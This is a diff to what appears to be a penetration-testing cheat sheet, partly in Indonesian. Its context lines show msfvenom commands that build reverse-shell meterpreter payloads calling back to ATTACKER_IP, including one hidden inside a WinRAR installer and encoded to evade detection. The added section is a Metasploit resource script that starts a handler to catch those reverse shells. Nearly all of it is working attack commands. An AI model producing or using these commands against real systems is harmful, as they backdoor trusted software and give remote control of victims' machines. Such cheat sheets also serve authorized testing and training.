@@ -499,6 +499,23 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -i 10 -x ~/Downloads/wrar602.exe -e x86/shikata_ga_nai -f exe > winrar.exe
 ```
 
+### Automating Metasploit With Resource Scripts
+
+```bash
+Buat file terlebih dahulu dan simpan
+nano handler.rc
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 4444
+run
+
+Jalankan
+msfconsole -r handler.rc
+
+```
+
 ---
 
 ## 7. Exploitation
